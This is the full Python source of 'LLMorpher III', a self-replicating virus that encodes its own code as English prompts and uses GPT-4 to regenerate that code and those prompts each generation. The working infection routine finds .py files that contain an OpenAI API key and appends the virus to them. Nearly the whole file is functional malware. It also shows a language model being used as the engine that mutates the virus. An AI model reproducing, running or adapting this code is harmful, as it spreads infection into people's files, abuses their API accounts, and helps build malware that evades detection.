
# LLMorpher III by Second Part To Hell
# A new-age AI-based self-replicator, powered by OpenAIs GPT. 
# Fully encodes virus computer-code into natural language.
#
# - LLMorpherI:
#    --> Fully encodes virus computer-code into natural language
#    --> Completely re-generates code every generation via GPT3.5
#    --> Constant prompts
#
# - LLMorpherII:
#    --> Fully encodes virus computer-code into natural language
#    --> Completely re-generates code every generation via GPT3.5
#    --> Slightly modifies the prompts every generation via GPT3.5
#
# - LLMorpherIII:
#    --> Fully encodes virus computer-code into natural language
#    --> Completely re-generates code every generation via GPT4
#    --> Completely re-generates prompts every generation via GPT4
#
#
# LLMorpherIII: At every generation, the prompts inside of the virus
#               generate the viral code, and the code for the next generation,
#               via calls to GPT4. Furthermore, every prompts is re-generated
#               by asking GPT4 to explain the generated code in english langauge.
#              
# 
# See my text for details: Using GPT to encode and mutate computer viruses entirely in natural language
#
# August 2023
# https://github.com/SPTHvx/SPTH
# sperl.thomas@gmail.com
# twitter: @SPTHvx     

import openai
openai.api_key = "..." # here goes your OpenAI API key


prompts_list=[]
tofile_list=[]
prompts_list.append("The function get_files returns a list of all Python (.py) files in the current directory using os.listdir and filtering with os.path.isfile.")
prompts_list.append("The function read_file reads and returns the content of the specified filename using the open function in read mode.")
prompts_list.append("The function is_key checks if the string s contains the text 'openai.api_key' exactly once and returns a boolean result.")
prompts_list.append("The code defines a function add_variables with parameters preprompt_var and element. Inside, it concatenates preprompt_var, a newline character '\n\n', and element, assigning the result to variable s, then returns s.")
prompts_list.append("The variable combined_list_tofile is assigned the results of processing tofile_list through the comp_list_fct function.")              
prompts_list.append("The code sets a variable named preprompt_var1 with the string value ' Explain these code lines, and'.")
prompts_list.append("The code assigns the string value ' strictly follow these 5 rules: 1) no furhter interpretation of code before or after! 2) mention ALL variable names and variable types, ' to a variable named preprompt_var2.")
prompts_list.append("The code assigns the string value ' function names and function arguments (including default values!!).' to a variable named preprompt_var3.")
prompts_list.append("The code assigns the string value ' 3) Especially, take care and write ' to a variable named preprompt_var4.")
prompts_list.append("The code assigns the string value ' the FULL content of strings! 4) If applicable, be explicit about the order of string concatenating! 5) Do not ignore the following ' to a variable named preprompt_var5.")
prompts_list.append("The code assigns the string value ' command: Output the whole code explanation in one line only, do not write ' to a variable named preprompt_var6.")
prompts_list.append("The code assigns the string value ' more than one line: ' to a variable named preprompt_var7.")
prompts_list.append("The code concatenates the string values stored in the variables preprompt_var1, preprompt_var2, preprompt_var3, preprompt_var4, preprompt_var5, preprompt_var6, and preprompt_var7 in the given sequence and assigns the resulting concatenated string to the variable named preprompt_var.")
prompts_list.append("The variable prompts_list_new is initialized as an empty list.")
prompts_list.append("The code iterates over each element in complete_list, concatenates preprompt_var and the element using the add_variables function storing the result in full_prompt, then obtains a text using the return_text function with full_prompt as its input, storing the outcome in res, and finally appends res to the prompts_list_new list.")
prompts_list.append("The variable str_tofile_new is initialized as an empty list.")
prompts_list.append("The code iterates over each element in combined_list_tofile, concatenates preprompt_var and the element using the add_variables function, saving the result in full_prompt, then calls the return_text function with full_prompt as an argument to obtain a text, saving the outcome in res, and finally appends res to the str_tofile_new list.")
prompts_list.append("The code replaces all double quotes (chr(34)) with single quotes (chr(39)) and removes whitespace from both ends of each string s in the list prompts_list_new, reassigning the modified list back to prompts_list_new.")
prompts_list.append("The code iterates over each string s in the list str_tofile_new, replaces all double quotes (chr(34)) with single quotes (chr(39)), removes whitespace from both ends, and reassigns the modified list back to str_tofile_new.")
prompts_list.append("The code defines a function named chr_val_return with an optional parameter named optional that defaults to 0, and when called, the function returns the character represented by the ASCII value 34, which is the double quotation mark (').")
prompts_list.append("The code initializes a variable named valA and assigns it the string value 'prompts_list'.")
prompts_list.append("The code initializes a variable named valB and assigns it the string value 'tofile_list'.")
prompts_list.append("The code initializes a variable named str_dot and assigns it the string value '.'.")
prompts_list.append("The code initializes a variable named val0 and assigns it the string value 'append('.")
prompts_list.append("The code assigns the value of val0 added to the result of the function chr_val_return() to the variable val1.")
prompts_list.append("The code assigns the string containing a single newline character (\n) to the variable str_nnn.")
prompts_list.append("The code defines a variable val2 and assigns it a value that is a concatenation of the result from the function call chr_val_return(), the string ')', and the value of the variable str_nnn.")
prompts_list.append("The code assigns the string 'prompts' to the variable str_tofileA1.")
prompts_list.append("The code assigns the string '_list' to the variable str_tofileA2.")
prompts_list.append("The code assigns the string 'tofile' to the variable str_tofileA3.")
prompts_list.append("The code assigns the string value '=[]' to a variable named str_tofileC.")
prompts_list.append("The code concatenates the values of variables str_tofileC, str_nnn, str_tofileA3, and str_tofileA2 in that order and assigns the resulting string to a variable named str_tofileB.")
prompts_list.append("The code concatenates the values of variables str_nnn, str_tofileA1, str_tofileA2, str_tofileB, str_tofileC, and str_nnn in that exact order and assigns the resulting string to a variable named str_tofileX.")
prompts_list.append("The code initializes an empty string str_tofile1.")
prompts_list.append("The code initializes an empty string str_tofile1. For each element in the list prompts_list_new, it appends the concatenation of valA, str_dot, val1, the current element, val2, and str_nnn to str_tofile1.")
prompts_list.append("The code initializes an empty string str_tofile2.")
prompts_list.append("The code initializes an empty string str_tofile2. For each element in the string str_tofile_new, it appends the concatenation of valB, str_dot, val1, the current element, val2, and str_nnn to str_tofile2.")
prompts_list.append("The code concatenates three string variables (str_tofileX, str_tofile1, and str_tofile2) and assigns the resulting string to the variable str_pretofile.")
prompts_list.append("The code takes a string str_pretofile and appends each element of the list combined_list_tofile to it, separated by newline characters (\n). It then assigns the resulting string to the variable str_tofile.")
prompts_list.append("The code iterates over each curr_file returned by the get_files function, reads its content using the read_file function, and if the is_key function determines the content contains a key, it appends the string stored in str_tofile to the current file, preceded by a newline.")
prompts_list.append("Write a python code (only this one line) which prints: 'LLMorphism III by SPTH - a new-age AI-based linguisto-morphic self-replicator, powered by OpenAIs GPT. Fully encodes and mutates the code and natural language prompts.'.")
prompts_list.append("Write a python code (only this one line) which prints: 'Hugs to the valhalla gang - hh86, roy g biv, JPanic, herm1t!'.")
tofile_list.append("The code defines a function named get_str1 with an optional argument opt defaulted to 0, which returns the string '`'.")
tofile_list.append("The code defines a function named get_str with an optional argument opt defaulted to 0, which returns the result of concatenating the string output of get_str1 called three times.")
tofile_list.append("Defines a function pval_str with an optional argument opt defaulting to 0 and returns the string 'on(.*?)'.")
tofile_list.append("Defines a function get_pattern with an optional argument opt defaulting to 0. Inside, sets pattern by concatenating the result of get_str(), the string 'pyth', the result of pval_str(), and again the result of get_str(). The function then returns this pattern.")
tofile_list.append("Imports the re module. Defines a function modify_response taking s as an argument. Inside, sets pattern using the get_pattern() function. Searches for this pattern in s with multiline matches (re.DOTALL). If a match is found, returns the first captured group; otherwise, returns the original s.")
tofile_list.append("The function create_prompt appends the input prompt to a predefined instruction string 'Create a careful python code following the description, without any tests or examples! Assume all functions and variables exist, do not redefine them! dont produce dummy functions! ' and returns the concatenated result.")
tofile_list.append("The code defines a function openai_getmessage that takes a parameter completion. Inside the function, it checks if completion is of type string (str) and directly returns it; otherwise, it extracts the content of the first choice's message from completion into the variable msg and then returns msg.")
tofile_list.append("The function return_openai takes one argument prompt, then calls the openai.ChatCompletion.create method with arguments model='gpt-4', messages=[{'role': 'user', 'content': prompt}], and temperature=0.1. It assigns the result to the variable completion. Then it calls the openai_getmessage function with argument completion and assigns the result to message1. Subsequently, it calls the modify_response function with argument message1 and assigns the result to message2. Finally, it returns the value of message2.")
tofile_list.append("The function return_text takes an argument named prompt. Inside, there's a while True loop that attempts to call the function return_openai with the prompt argument and assigns its return value to new_response. If return_openai raises an exception, the code will catch it and continue the loop. Once return_openai completes without raising an exception, the loop breaks, and the function returns the value of new_response.")
tofile_list.append("In a single function named comp_list_fct, which takes an argument list_str (a list of strings), it initializes an empty list called combined_list. For each str in list_str, it calls create_prompt(str) and passes its result to return_text(). The result res is then appended to combined_list. After iterating through all strings, it returns combined_list.")
tofile_list.append("The code calls the function comp_list_fct with the argument prompts_list and assigns the returned value to the variable complete_list.")
tofile_list.append("The code constructs complete_str by joining each element of complete_list into a single string separated by newline characters.")
tofile_list.append("The code executes the content of the variable complete_str as python code using the exec function.")


def get_str1(opt=0):
    return '`'

def get_str(opt=0):
    return get_str1()+get_str1()+get_str1()

def pval_str(opt=0):
    return 'on(.*?)'

def get_pattern(opt=0):
    pattern=get_str()+'pyth'+pval_str()+get_str()
    return pattern

import re
def modify_response(s):
    pattern = get_pattern()
    match = re.search(pattern, s, re.DOTALL)
    
    if match:
        return match.group(1)
    else:
        return s


def create_prompt(prompt):
    prompt2='Create a careful python code following the description, without any tests or examples! Assume all functions and variables exist, do not redefine them! dont produce dummy functions! : '
    prompt2+=prompt
    return prompt2

def openai_getmessage(completion):
    if isinstance(completion, str):
        return completion
    else:
        msg=completion.choices[0].message.content
        return msg

def return_openai(prompt):
    completion = openai.ChatCompletion.create(
        model='gpt-4',
        messages=[{"role": "user", "content": prompt}],
        temperature=0.0,
    )
    message1=openai_getmessage(completion)
    message2=modify_response(message1)
    return message2


def return_text(prompt):
    while True:
        try:
            new_response=return_openai(prompt)
            break
        except:
            pass
    return new_response
                
        
def comp_list_fct(list_str):
    combined_list = []
    for str in list_str:
        res=return_text(create_prompt(str))
        combined_list.append(res)
    return combined_list
complete_list = comp_list_fct(prompts_list)

complete_str='\n'.join(complete_list)

# In the next generations, we will run the code in complete_str via exec(complete_str).
# For convincience, here is the code that is hidden inside of the english language.
# This infects .py files, the next generation does not show this code.
#exec(complete_str)

    
import os
def get_files():
    file_list = [f for f in os.listdir() if f.endswith('.py') and os.path.isfile(f)]
    return file_list

def read_file(filename):
    with open(filename, 'r') as file:
        return file.read()

def is_key(s):
    return s.count('openai.api_key') == 1

def add_variables(preprompt,element):
    s=preprompt+'\n\n'+element
    return s

combined_list_tofile=comp_list_fct(tofile_list)
preprompt_var1 = ' Explain these code lines, and'
preprompt_var2 = ' strictly follow these 5 rules: 1) no furhter interpretation of code before or after! 2) mention ALL variable names, '
preprompt_var3 = ' function names and function arguments (including default values!!).'
preprompt_var4 = ' 3) Especially, take care and write '
preprompt_var5 = ' the FULL content of strings! 4) If applicable, be explicit about order string concatenating! 5) Do not ignore the following '
preprompt_var6 = ' command: Output the whole code explanation in one line only, do not write '
preprompt_var7 = ' more than one line: '
preprompt_var=preprompt_var1+preprompt_var2+preprompt_var3+preprompt_var4+preprompt_var5+preprompt_var6+preprompt_var7

prompts_list_new=[]
for element in complete_list:
    full_prompt=add_variables(preprompt_var,element)
    res=return_text(full_prompt)
    prompts_list_new.append(res)

str_tofile_new=[]
for element in combined_list_tofile:
    full_prompt=add_variables(preprompt_var,element)
    res=return_text(full_prompt)
    str_tofile_new.append(res)

prompts_list_new = [s.replace(chr(34), chr(39)).strip() for s in prompts_list_new]
str_tofile_new = [s.replace(chr(34), chr(39)).strip() for s in str_tofile_new]

str_nnn='\n'
str_tofileA1 = 'prompts'
str_tofileA2='_list'
str_tofileA3='tofile'
str_tofileC ='=[]'
str_tofileB = str_tofileC+str_nnn+str_tofileA3+str_tofileA2
str_tofileX=str_nnn+str_tofileA1+str_tofileA2+str_tofileB+str_tofileC+str_nnn
def chr_val_return(optional=0):
    return chr(34)

valA='prompts_list'
valB='tofile_list'
str_dot='.'
val0='append('
val1=val0+chr_val_return()
val2=chr_val_return()+')'+str_nnn

str_tofile1=''
for element in prompts_list_new:
    str_tofile1 += valA+str_dot+val1+element+val2+str_nnn

str_tofile2=''
for element in str_tofile_new:
    str_tofile2 += valB+str_dot+val1+element+val2+str_nnn


str_pretofile=str_tofileX+str_tofile1+str_tofile2

str_tofile=str_pretofile+'\n'.join(combined_list_tofile)

for curr_file in get_files():
    content=read_file(curr_file)
    if is_key(content):
        with open(curr_file, 'a') as file:
            file.write('\n' + str_tofile)
